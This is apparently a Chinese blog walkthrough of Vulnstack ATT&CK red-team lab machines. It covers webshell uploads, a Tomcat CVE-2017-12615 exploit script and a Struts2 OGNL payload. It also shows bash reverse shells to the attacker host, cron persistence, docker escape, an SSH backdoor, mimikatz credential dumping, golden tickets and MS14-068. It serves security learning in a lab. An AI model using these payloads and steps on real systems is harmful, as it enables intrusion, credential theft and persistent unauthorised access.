title: ATT&CK红队评估实战靶场
author: bmth
tags:
  - 内网渗透
categories: []
img: 'https://img-blog.csdnimg.cn/20210525205719281.png'
date: 2021-05-25 20:27:00
---
最近在学内网，但没有啥实例给我用，就下载了ATT&CK红队评估实战靶场：[http://vulnstack.qiyuanxuetang.net/vuln/](http://vulnstack.qiyuanxuetang.net/vuln/)，来进行学习，冲冲冲
![](https://img-blog.csdnimg.cn/20210525205719281.png)
## ATT&CK实战系列——红队实战（一）
win7为VM1，win2003为VM2，win2008为VM3
![](https://img-blog.csdnimg.cn/20210520170122694.png)
kali设置成NAT模式，win7网络适配器1设置成自定义（VMnet1仅主机模式），网络适配器2设置成NAT模式，win2003、win2008 网络适配器设置成自定义（VMnet1仅主机模式）
主机默认开机密码都是hongrisec@2019，需要在win7的c盘下开启phpstudy，打开虚拟机更改密码为bmth@123456
```
Kali1：192.168.81.128
Kali2：192.168.81,135
win7 内网ip：192.168.52.143  外网ip：192.168.81.136
win2003 ip：192.168.52.141
win2008 ip：192.168.52.138
```
使用nmap扫描一下端口，发现只开放了80和3306
![](https://img-blog.csdnimg.cn/20210520181346348.png)
### 网站getshell
扫描目录发现存在phpmyadmin和beifen.rar，可以知道网站为yxcms！
#### 方法一
第一种为弱密码，发现后台地址为：`http://192.168.81.136/yxcms/index.php?r=admin/index/login`，使用admin，123456登录成功，直接就可以编辑文件了，写入一句话
![](https://img-blog.csdnimg.cn/20210520182854681.png)
![](https://img-blog.csdnimg.cn/20210520183007223.png)
#### 方法二
第二种方式为phpmyadmin后台getshell，发现root，root 成功登陆，用开启全局日志的方式getshell，在SQL语句部分执行这两条命令：
```sql
set global general_log=on;# 开启日志
set global general_log_file='C:/phpstudy/www/yxcms/bmth.php';# 设置日志位置为网站目录
```
然后查看一下 `SHOW VARIABLES LIKE '%general%';`
![](https://img-blog.csdnimg.cn/20210520183943340.png)
最后写入日志文件即可，执行 `select "<?php eval($_POST['bmth']);?>";`语句即可getshell
![](https://img-blog.csdnimg.cn/20210520184156114.png)
### 内网渗透
#### 主机信息收集
`net config Workstation` (当前计算机名，全名，用户名，系统版本，工作站域，登陆域)
![](https://img-blog.csdnimg.cn/20210522132527599.png)
发现当前域是god.org，`systeminfo` 查看系统信息，得到登录服务器名是OWA
![](https://img-blog.csdnimg.cn/20210525160240904.png)

查询已安装的软件及版本信息：`wmic product get name,version`
![](https://img-blog.csdnimg.cn/20210522182346361.png)
powershell 中可替代该命令的是 Get-WmiObject:
```powershell
Get-WmiObject -class win32_product | Select-Object -property name,version
```
查询进程及服务：`wmic process list brief`
![](https://img-blog.csdnimg.cn/20210525160806323.png)
安装软件信息：`run post/windows/gather/enum_applications`
![](https://img-blog.csdnimg.cn/20210525161215440.png)

#### 开启3389
首先查看一下当前用户的权限，尝试远程连接，查看一下3389端口开放情况
![](https://img-blog.csdnimg.cn/20210520184721303.png)
发现3389处于关闭状态，使用命令开启（关闭命令把如下0都换成1）
```bash
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```
![](https://img-blog.csdnimg.cn/20210520184901338.png)
然后添加用户连接3389
```bash
net user test bmth@123456 /add # 添加账户密码
net localgroup administrators test /add # 添加为管理员权限
net user test # 查询是否添加成功
```
![](https://img-blog.csdnimg.cn/20210520190241825.png)

但发现连不上3389，nmap扫描一下`nmap -v -p 3389 -n 192.168.81.136`
![](https://img-blog.csdnimg.cn/20210520185936110.png)
发现状态为filtered，查看win7，防火墙开启了阻止所有与未在允许程序列表中的程序的连接，设置了白名单，只能本地连接，这里尝试关闭防火墙
```bash
netsh advfirewall set allprofiles state off
```
![](https://img-blog.csdnimg.cn/20210520193138494.png)
成功关闭防火墙，那么就可以远程连接了
![](https://img-blog.csdnimg.cn/20210520193516914.png)
使用`netstat -an`查看开放端口
![](https://img-blog.csdnimg.cn/20210525155943606.png)
还可以使用msf开启3389端口，直接`run post/windows/manage/enable_rdp`
![](https://img-blog.csdnimg.cn/20210521113623632.png)
#### 主机密码收集
接下来我们尝试获取密码，首先使用msfvenom生成一个exe文件
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.81.135 LPORT=6666 -f exe > shell.exe
```
![](https://img-blog.csdnimg.cn/20210520200532336.png)
然后使用蚁剑运行程序，并使用msf
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.81.135
set lport 6666
run
```
![](https://img-blog.csdnimg.cn/20210520200711621.png)
这里提权直接`getsystem`，其实可以`systeminfo`查看当前补丁，然后在：[Windows提权EXP在线搜索工具](http://blog.neargle.com/win-powerup-exp-index/)，查找相关的exp
得到system权限后需要把进程迁移到system权限下，ps查看一下，我这里迁移到svchost.exe
![](https://img-blog.csdnimg.cn/20210520201215228.png)
使用kiwi来获取密码，直接
```bash
load kiwi  # help kiwi 查看帮助
creds_wdigest  # 获取账号密码
```
成功得到密码
![](https://img-blog.csdnimg.cn/20210520201358167.png)
这里看了另一篇文章，发现可以使用`procdump`导出 lsass.dmp，然后使用`mimikatz`抓取密码
学习一下，先将procdump上传到win7上，执行：
```bash
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```
![](https://img-blog.csdnimg.cn/20210521115921840.png)
成功得到文件lsass.dmp，传回到本地使用：
```bash
sekurlsa::minidump ./lsass.dmp
sekurlsa::logonpasswords
```
![](https://img-blog.csdnimg.cn/20210521120244447.png)
#### CS上号
启动：`./teamserver 本机ip 连接密码`
![](https://img-blog.csdnimg.cn/20210521121105924.png)
运行start.bat，输入Host，User和Password
![](https://img-blog.csdnimg.cn/2021052213291997.png)
设置Listeners
![](https://img-blog.csdnimg.cn/202105211250009.png)
这里我们使用Attacks->Web Drive-by->Scripted Web Delivery，成功后会生成一条命令，使用蚁剑虚拟终端输入命令即可
![](https://img-blog.csdnimg.cn/20210521125648913.png)
这里再使用CS生成木马试一下，Attacks->Packages->Windows Executable
![](https://img-blog.csdnimg.cn/20210521134741615.png)

运行即可，注意这里要是安装了杀毒软件会被杀掉，需要免杀
![](https://img-blog.csdnimg.cn/20210521134705399.png)
执行 shell 命令前面加上 shell 就可以了，例如 `shell ipconfig`
![](https://img-blog.csdnimg.cn/20210521133331631.png)


使用 hashdump 和 logonpasswords 可以读内存和注册表密码，在 Credentials 模块下查看
![](https://img-blog.csdnimg.cn/20210521132718325.png)
#### 探测内网端口
对目标网段进行端口存活探测，因为是 psexec 传递登录，这里仅需探测445端口
命令：portscan ip网段 端口 扫描协议（arp、icmp、none） 线程
```bash
portscan 192.168.52.0/24 445 arp 200
```
![](https://img-blog.csdnimg.cn/20210521131239853.png)
也可以使用CS扩展的Ladon插件探测内网存活主机情况，[https://github.com/k8gege/Aggressor](https://github.com/k8gege/Aggressor)
`Ladon 192.168.52.0/24 OnlinePC`
![](https://img-blog.csdnimg.cn/20210522152354545.png)
得到内网的两个靶机ip

#### CS下的会话传给MSF
首先在CS上新建一个监听器，类型为foreign
![](https://img-blog.csdnimg.cn/20210522153656896.png)
然后在msf上执行
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.81.135
set lport 1234
run
```
然后在CS中选中计算机，右键->Spawn，并选择刚刚创建的监听器![](https://img-blog.csdnimg.cn/20210522155120689.png)

### 横向移动
#### 使用cs的socks功能将msf带入内网
打开会话，输入`socks 1234`，点击Tunnel->Proxy Pivots
![](https://img-blog.csdnimg.cn/20210525162649519.png)
在msf中运行
```bash
setg Proxies socks4:192.168.81.135:1234
setg ReverseAllowProxy true      #允许反向代理
```
然后修改`/etc/proxychains.conf`文件
![](https://img-blog.csdnimg.cn/20210525174047808.png)
使用`use auxiliary/scanner/smb/smb_ms17_010`，发现都存在ms17-010
![](https://img-blog.csdnimg.cn/20210525163425549.png)
#### msf 添加路由、挂Socks4a代理
>添加路由的目的是为了让MSF其他模块能访问内网的其他主机，即52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递
添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务
（添加路由一定要在挂代理之前，因为代理需要用到路由功能）

`run autoroute -s 192.168.52.0/24`
![](https://img-blog.csdnimg.cn/20210525173005996.png)
```bash
use auxiliary/server/socks_proxy   #添加socks4a代理
show options
set version 4a  
set srvport 1234   #设置端口
run
```
![](https://img-blog.csdnimg.cn/20210525173505724.png)
同理需要修改`/etc/proxychains.conf`
使用 `use auxiliary/scanner/portscan/tcp` 或者`proxychains nmap -p 1-1000 -Pn -sT 192.168.52.141`扫描端口(注意一定要加上-Pn和-sT参数)
![](https://img-blog.csdnimg.cn/20210525185734202.png)

#### Neo-reGeorg
[https://github.com/L-codes/Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)，还可以使用Neo-reGeorg来进行代理socks5
直接`python3 neoreg.py generate -k bmth`生成文件
![](https://img-blog.csdnimg.cn/8df46dc55a7245188d483bda470ef288.png)
然后上传到服务器中，连接`python3 neoreg.py -k bmth -u http://192.168.239.136/yxcms/tunnel.php`
![](https://img-blog.csdnimg.cn/3c717421c7b944a6bc9862c6243b8b95.png)
最后编辑`/etc/proxychains.conf`加入`socks5 127.0.0.1 1080`即可


#### ms17_010_command
发现很多的漏洞都拿不到shell，只能使用
```
use auxiliary/admin/smb/ms17_010_command
set rhosts 192.168.52.141
set command whoami
run
```
![](https://img-blog.csdnimg.cn/2c74b5b062ab414296f191fcef5307f5.png)
创建用户，将用户加入administrators组，开启3389端口
```
set command net user test bmth@123456 /add
set command net localgroup administrators test /add
set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
```
然后使用`proxychains rdesktop 192.168.52.141`连上3389
![](https://img-blog.csdnimg.cn/5d5fde2a895c4bf7ac150cb65951bfeb.png)

参考文章：
[红日安全-ATT&amp;amp;CK实战：Vulnstack靶场实战（一）](https://www.freebuf.com/articles/web/252594.html)
[ATT&CK实战系列——红队实战（一）](https://www.cnblogs.com/wkzb/p/12358076.html)
[ATT&CK实战系列——红队实战（一）学习内网渗透](http://cn-sec.com/archives/124820.html)


## ATT&CK实战系列——红队实战（二）
本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX

注意这里要将我们的NET模式下的子网ip改为`192.168.111.0`
![](https://img-blog.csdnimg.cn/20210526142320889.png)
web机的初始的状态默认密码无法登录，需要切换用户，`de1ay/1qaz@WSX` 登录
并且需要手动开启服务，在 `C:\Oracle\Middleware\user_projects\domains\base_domain\bin` 下有一个`startWeblogic`的批处理，管理员身份运行它即可，管理员账号密码：`Administrator/1qaz@WSX`
![](https://img-blog.csdnimg.cn/20210526145015855.png)
WEB机和PC机：计算机右键->管理找到服务，将Server、Workstation、Computer Browser 全部启动
```
kali：192.168.111.129
DC：内网ip：10.10.10.10
PC：外网ip： 192.168.111.201 内网ip：10.10.10.210
WEB：外网ip：192.168.111.80 内网ip：10.10.10.80
```
首先扫描端口，由于存在**防火墙**不能使用icmp包，使用syn包探测，-sS 使用SYN半开式扫描，又称隐身扫描 -sV 服务探测
```bash
nmap -sS -sV 192.168.111.80
```
![](https://img-blog.csdnimg.cn/20210526145856581.png)
>通过扫描端口，我们通过端口初步判断目标机存在的服务及可能存在的漏洞，如445端口开放就意味着存smb服务，存在smb服务就可能存在ms17-010/端口溢出漏洞。开放139端口，就存在Samba服务，就可能存在爆破/未授权访问/远程命令执行漏洞。开放1433端口，就存在mssql服务，可能存在爆破/注入/SA弱口令。开放3389端口，就存在远程桌面。开放7001端口就存在weblogic。

再来扫描PC机的端口
![](https://img-blog.csdnimg.cn/2021052711561399.png)
### Getshell
#### weblogic
由于存在weblogic，那么使用工具：[https://github.com/rabbitmask/WeblogicScan](https://github.com/rabbitmask/WeblogicScan)
```bash
python3 WeblogicScan.py -u 192.168.111.80 -p 7001
```
![](https://img-blog.csdnimg.cn/2021052615070374.png)
发现存在CVE-2018-2893和CVE-2019-2725，其中CVE-2018-2893网上的利用方式都失效了，会超时
利用工具：[https://github.com/zhzyker/exphub.git](https://github.com/zhzyker/exphub.git)

再测试第二个CVE，访问：`_async/AsyncResponseService`，发现存在漏洞
![](https://img-blog.csdnimg.cn/20210526155346457.png)
直接上Java反序列化终极测试工具
![](https://img-blog.csdnimg.cn/20210526174143217.png)
然后上传冰蝎马，[weblogic上传木马路径选择 ](https://www.cnblogs.com/sstfy/p/10350915.html)
```java
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
```
上传到：`C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp`
![](https://img-blog.csdnimg.cn/20210526183720985.png)
然后文件路径在：`http://192.168.111.80:7001/console/framework/skins/wlsconsole/images/shell.jsp`，冰蝎连接即可
![](https://img-blog.csdnimg.cn/20210526184005213.png)
这里发现其实还存在ssrf漏洞，存在于`http://192.168.111.80:7001/uddiexplorer/SearchPublicRegistries.jsp`
[Weblogic-SSRF漏洞复现](https://www.cnblogs.com/bmjoker/p/9759761.html)
使用msf来进行测试CVE-2019-2725漏洞
 ```bash
 use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
 show options
 set rhosts 192.168.111.80
set lhost 192.168.111.129
set target 1   #将target改为windows
run
 ```
 ![](https://img-blog.csdnimg.cn/2021052619071095.png)
 #### ms17-010
由于开放了445端口，尝试使用ms17-010扫描模块
 ```bash
 use auxiliary/scanner/smb/smb_ms17_010
set rhosts 192.168.111.80
run
 ```
 ![](https://img-blog.csdnimg.cn/20210526193013283.png)
 发现可能存在漏洞，使用`use exploit/windows/smb/ms17_010_eternalblue` 进行攻击
![](https://img-blog.csdnimg.cn/2021052619320694.png)
发现可以直接getsystem提权到最高权限
### 内网渗透
首先拿出我们万能的cs，使用冰蝎上线木马
#### 提权
发现权限为Administrator，进行提权
![](https://img-blog.csdnimg.cn/202105262022198.png)
测试发现使用svc-exe可以成功获取system权限，还可以使用插件：[https://github.com/DeEpinGh0st/Erebus](https://github.com/DeEpinGh0st/Erebus)

这里继续尝试CVE-2019-1388：Windows UAC本地提权，[https://github.com/mai-lang-chai/System-Vulnerability](https://github.com/mai-lang-chai/System-Vulnerability)
3389连接到WEB机，以管理员身份运行hhupd.exe![](https://img-blog.csdnimg.cn/20210528164427850.png)
点击颁发者，进入web页面另存为，在文件名输入：`C:\Windows\System32\*.* `，回车
![](https://img-blog.csdnimg.cn/20210528164941874.png)
找到cmd右键打开，权限即提升到system了
![](https://img-blog.csdnimg.cn/20210528170258211.png)
#### 横向渗透
Run Mimikatz：
![](https://img-blog.csdnimg.cn/20210526203009451.png)
成功获取账号密码，扫描内网
```
Ladon 10.10.10.0/24 OnlinePC  # 多协议探测存活主机（IP、机器名、MAC地址、制造商）
Ladon 10.10.10.0/24 OsScan #多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）
```
![](https://img-blog.csdnimg.cn/2021052620324969.png)
`ipconfig /all`，发现域控ip：10.10.10.10 (域控一般是本机的DNS服务器)
![](https://img-blog.csdnimg.cn/20210527115329582.png)
`portscan 10.10.10.0/24 445 arp 200`来进行ip存活探测
![](https://img-blog.csdnimg.cn/20210527131915367.png)
SMB Beacon，使用psexec传递
>psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行，像 telnet 客户端一样。原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务。

首先创建一个Listener
![](https://img-blog.csdnimg.cn/20210527154745191.png)
工具栏 View->Targets 查看端口探测后的存活主机，使用psexec横向移动
![](https://img-blog.csdnimg.cn/2021052715503792.png)
发现PC和DC两台靶机成功上线
![](https://img-blog.csdnimg.cn/20210527155336489.png)
### 权限维持
#### 黄金票据利用
黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证
[域渗透之（黄金票据利用）](https://blog.csdn.net/cj_Allen/article/details/104297452)

>黄金票据的条件要求：
1.域名称
2.域的SID值
3.域的KRBTGT账户NTLM密码哈希
4.伪造用户名

黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。

`hashdump`获得KRBTGT账户NTLM密码哈希
![](https://img-blog.csdnimg.cn/2021052716143274.png)
`logonpasswords` 获取SID
![](https://img-blog.csdnimg.cn/20210527161750243.png)
WEB机 Administrator 右键->Access->Golden Ticket
![](https://img-blog.csdnimg.cn/20210527162541431.png)

![](https://img-blog.csdnimg.cn/20210527162514828.png)
那么就可以通过当前WEB机访问DC域了
![](https://img-blog.csdnimg.cn/20210527162818108.png)

参考文章：
[ATT&CK实战系列——红队实战（二）](https://blog.csdn.net/qq_36241198/article/details/115604073)

## ATT&CK实战系列——红队实战（四）
**机器密码：**
>ubuntu：ubuntu
douser：Dotest123
administrator：Test2008

**ip：**
>攻击机kali：192.168.157.129
>ubuntu 64位：192.168.157.128，192.168.183.132
>dc：192.168.183.130
>win7：192.168.183.133(因为不是一天打完的，重启靶机发现ip变为了：192.168.183.134)

![](https://img-blog.csdnimg.cn/4ee587055ba44840b030c2ab432e2bbe.png)
需要手动开启靶机
![](https://img-blog.csdnimg.cn/c27f7cb0f33d423ba87b4c3dae2289bd.png)
### 获取webshell
首先使用nmap扫描一下`nmap -A -sS -sV -v -p- 192.168.157.128`
![](https://img-blog.csdnimg.cn/e09ffa593219428ca5230e62f4268066.png)
发现依次是Struts2，Tomcat和phpMyAdmin
#### Struts2-045漏洞利用
使用Struts2-Scan发现失败了，换一个vulhub试试，[https://github.com/zhzyker/vulmap](https://github.com/zhzyker/vulmap)
![](https://img-blog.csdnimg.cn/66b0028a7a3b4f0ab25b5bb5f2190b14.png)
直接抓包修改Content-Type
```java
"%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"ls"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```
![](https://img-blog.csdnimg.cn/ac49505203484261b1a27faeb854c4f2.png)
发现为root权限，那么直接尝试反弹shell
```bash
bash -i >& /dev/tcp/192.168.157.129/6666 0>&1
```
![](https://img-blog.csdnimg.cn/a0d6a1700bb147b9b41d58176f515653.png)
成功获取shell，并且为root权限
#### Tomcat PUT方法任意写文件漏洞
2002端口为tomcat，同样使用vulmap查看一下，发现存在CVE-2017-12615
![](https://img-blog.csdnimg.cn/16c3e5ee6ad5484bb39b5cff78c3b6bc.png)
直接使用exp上传webshell
```python
#!/usr/bin/env python
# coding:utf-8

import requests
import sys
import time

if len(sys.argv)!=2:
    print('+----------------------------------------------------------+')
    print('+ USE: python <filename> <url>                             +')
    print('+ EXP: python cve-2017-12615_cmd.py http://1.1.1.1:8080 id +')
    print('+ VER: Apache Tomcat 7.0.0 - 7.0.81                        +')
    print('+----------------------------------------------------------+')
    print('+ DES: 临时创建 Webshell exphub.jsp                        +')
    print('+----------------------------------------------------------+')
    sys.exit()
url = sys.argv[1]
payload_url = url + "/exphub.jsp/"
payload_header = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}

def payload_command (command_in):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in)+"</string>"
    payload_1 = command_filtered
    return payload_1

def creat_command_interface():
    payload_init = "<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();" \
                "int a = -1;" \
                "byte[] b = new byte[2048];" \
                "while((a=in.read(b))!=-1){out.println(new String(b));}" \
                "%>"
    result = requests.put(payload_url, headers=payload_header, data=payload_init)
    time.sleep(5)
    payload = {"cmd":"whoami"}
    verify_response = requests.get(payload_url[:-1], headers=payload_header, params=payload)
    if verify_response.status_code == 200:
        return 1
    else:
        return 0

def do_post(command_in):
    payload = {"cmd":command_in}
    result = requests.get(payload_url[:-1], params=payload)
    print result.content

if (creat_command_interface() == 1):
    print "[+] Put Upload Success: "+payload_url[:-1]+"?cmd=id\n"
else:
    print("[-] This host is not vulnerable CVE-2017-12615")
    exit()

while 1:
    command_in = raw_input("Shell >>> ")
    if command_in == "exit" : exit(0)
    do_post(command_in)
```
![](https://img-blog.csdnimg.cn/232e055624cb4f9ea9c8ad431c73f220.png)
这里写入冰蝎shell并且连接
![](https://img-blog.csdnimg.cn/d08576c38a0d4dd486c8b37b5553a261.png)

#### phpmyadmin漏洞利用
发现可以直接登录，并且发现版本为4.8.1,
![](https://img-blog.csdnimg.cn/a0b45325a17d446989ee7d31c7684212.png)
存在文件包含漏洞，可以包含session文件获取webshell
```
?target=db_sql.php%253f/../../../../../../../../etc/passwd
```
![](https://img-blog.csdnimg.cn/762e20d53dc34e209057574ae93b4baa.png)
将文件写入到session中，`select '<?php eval($_REQUEST[0]);?>' `
![](https://img-blog.csdnimg.cn/db7a700e141a457e91ff602202ddb426.png)
最后包含我们的session即可任意命令执行，写入一句话蚁剑连接即可
![](https://img-blog.csdnimg.cn/02280f2aa6dd4c9b94c63afd785e595a.png)
### docker逃逸
首先判断一下是否在docker容器中
`ls -al /`，发现存在.dockerenv文件
![](https://img-blog.csdnimg.cn/51fa537e08d24cab93740116b5a0463c.png)
查看系统进程的cgroup信息，`cat /proc/1/cgroup`
![](https://img-blog.csdnimg.cn/408635cc2b844beabbe335e2a9d12c80.png)
发现我们在docker容器内，需要逃逸
若启动Docker容器时，使用了privileged参数，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。
```
查看磁盘文件: fdisk -l
新建目录以备挂载: mkdir /aa
将宿主机/dev/sda1目录挂载至容器内 /aa: mount /dev/sda1 /aa
即可写文件获取权限或数据
```
![](https://img-blog.csdnimg.cn/9e32b20eed5b482ca6adecb6b06443c4.png)
#### 写入计划任务
首先写入反弹shell脚本
```bash
touch /aa/tmp/test.sh
chmod +x /test/tmp/test.sh
echo "#!/bin/bash" >> /aa/tmp/test.sh
echo "/bin/bash -i >& /dev/tcp/192.168.157.129/7777 0>&1" >> /aa/tmp/test.sh
```
![](https://img-blog.csdnimg.cn/38490bee532f43d0b92bda69101c432a.png)
然后写入计划任务在最后一行(每两分钟执行一次脚本)
```bash
sed -i '$a*/2 *    * * *    root  bash /tmp/test.sh ' /aa/etc/crontab
cat /aa/etc/crontab
```
![](https://img-blog.csdnimg.cn/1e1ddc0279784657aab41bfa2a405623.png)
成功反弹shell
![](https://img-blog.csdnimg.cn/81ba99ca153d447ab1d86756f5b74385.png)
#### 修改/etc/passwd
首先本地生成密码`perl -e 'print crypt("bmth", "salt")'`
![](https://img-blog.csdnimg.cn/ccea0691adb3440385dab885a26d0428.png)
直接把ubuntu的密码修改为我们的密码 `sam0c/mLMqJTU`
![](https://img-blog.csdnimg.cn/fd289491690e44a08df40e30eee158c4.png)
最后ssh连接即可，同理可以直接su提权到root权限
![](https://img-blog.csdnimg.cn/b5c428cc14d640f0a0c366b8b6b33021.png)

### 内网渗透
拿到root权限后需要进行权限维持，具体可参考文章：[Linux下常见的权限维持方式](https://zhuanlan.zhihu.com/p/116030154)
#### ssh软连接
>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 `/tmp/su` 在 `/etc/pam.d/` 目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是`auth sufficient pam_rootok.so`，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以

在目标服务器上执行一句话后门：
```bash
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888
```
最后使用任意密码都可登录成功
![](https://img-blog.csdnimg.cn/eec144ed15674bcea471a84a158dd035.png)
发现.bash.history，查看一下发现douser用户密码
![](https://img-blog.csdnimg.cn/dfc8abd7bff04b7fbeb96278ddd24475.png)

#### 横向移动
首先探测内网主机存活
```bash
for k in $( seq 1 255);do ping -c 1 192.168.183.$k|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
```
![](https://img-blog.csdnimg.cn/be5f8256f1744fcfac8d6428b714320e.png)
##### ew
这里使用的是ew来搭建socks代理
`./ew_for_linux64 -s ssocksd -l 1234`
然后修改`/etc/proxychains.conf`为
![](https://img-blog.csdnimg.cn/abf171250c8d4b6b8c1f8de4bc5d6db0.png)
然后探测端口
```
proxychains nmap -Pn -sT -T4 -p21,22,23,25,53,80,135,139,161,389,445,1080,1433,3306,3389,6379,7001,7002,8080 192.168.183.134
proxychains nmap -Pn -sT -T4 -p21,22,23,25,53,80,135,139,161,389,445,1080,1433,3306,3389,6379,7001,7002,8080 192.168.183.130
```
![](https://img-blog.csdnimg.cn/04f9eab0ce854d4d85bb4db1211f35a6.png)
发现win7开启了135,139,445端口，DC开启了53,135,139,389,445端口

##### chisel
发现ew比较容易断开，换一个代理工具chisel试试
服务端：`./chisel_1.7.6_linux_amd64 server -p 1234 --socks5`
![](https://img-blog.csdnimg.cn/3063efa220da459ea61cd66c027c2c8c.png)
攻击端：`./chisel_1.7.6_linux_amd64 client 192.168.157.128:1234 socks`
![](https://img-blog.csdnimg.cn/b4fd2abe1be24a9788274c64b5ac1cea.png)
然后设置socks5为`127.0.0.1:1080`，代理成功
![](https://img-blog.csdnimg.cn/113e7de8a541423488253d5f31b77c86.png)
##### ms17-010
将msf设置代理，直接使用永恒之蓝攻击win7
`use exploit/windows/smb/ms17_010_eternalblue`
![](https://img-blog.csdnimg.cn/50872019eadc4e91bb5e889ed9fab34a.png)
![](https://img-blog.csdnimg.cn/5e0fd0b08838401883f0c29bee978f98.png)
成功获取system权限，但发现shell连接不上，重新设置代理`setg Proxies socks5:127.0.0.1:1080`
执行`run post/windows/gather/enum_logged_on_users`查看目标主机有哪些用户
![](https://img-blog.csdnimg.cn/f911107eca9748caaa38e9a4e4a015b6.png)
降权到普通用户
```
load incognito    加载incoginto功能(用来盗窃目标主机的令牌或是假冒用户)
list_tokens -u     列出目标主机用户的可用令牌
impersonate_token "DEMO\douser"     假冒目标主机上的可用令牌
steal_token 3052     从进程窃取
rev2self     回到控制目标主机的初始用户账号下
```
![](https://img-blog.csdnimg.cn/0c04a5c72e584cfd9960a96ae3be29ee.png)
这里还是使用system权限，使用kiwi获取密码
![](https://img-blog.csdnimg.cn/3115d1e5e2bf466e82b73b59835de6f6.png)
开启3389端口：`run post/windows/manage/enable_rdp`
这里换为douser域用户，直接shell进去查看内网信息，发现存在乱码，使用`chcp 65001`即可
```
查询域名
net view /domain
查询域内主机
net view /domain:demo
查看完整域名
wmic computersystem get domain
查看是否是域名主机
net time /domain
查询域控
net group "domain controllers" /domain
查询域内用户
net group "domain users" /domain
查看域管理员	
net group "domain admins" /domain
查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域
net config Workstation
查询域控IP
nslookup WIN-ENS2VR5TR3N.demo.com
补丁信息
systeminfo
```
![](https://img-blog.csdnimg.cn/8fd867f3f19e469199a3cc1f864b5c47.png)
发现并未打ms14-068的补丁，查看一下SID `whoami /all`
![](https://img-blog.csdnimg.cn/cac5a57f0b874620833098ff31c5428f.png)
得到`demo\douser S-1-5-21-979886063-1111900045-1414766810-1107`
##### ms14-068
发现桌面有利用的工具，直接执行
```
MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130
```
![](https://img-blog.csdnimg.cn/d067bab9775d4aa59248b7aeb7107864.png)
使用mimikatz.exe导入票据，先`kerberos::purge`清除票据信息
载入票据，`kerberos::ptc TGT_douser@demo.com.ccache`
![](https://img-blog.csdnimg.cn/e7d556c3eae84334b68e3c6c247e095c.png)
`dir \\WIN-ENS2VR5TR3N\c$` 成功访问域控
可以使用goldenPac.exe来达到ms14-068+psexec的自动化利用，直接获取域控的shell，一步到胃
```
goldenPac.exe 域名/域用户名:域用户明文密码@域名
goldenPac.exe demo.com/douser:Dotest123@WIN-ENS2VR5TR3N.demo.com
```
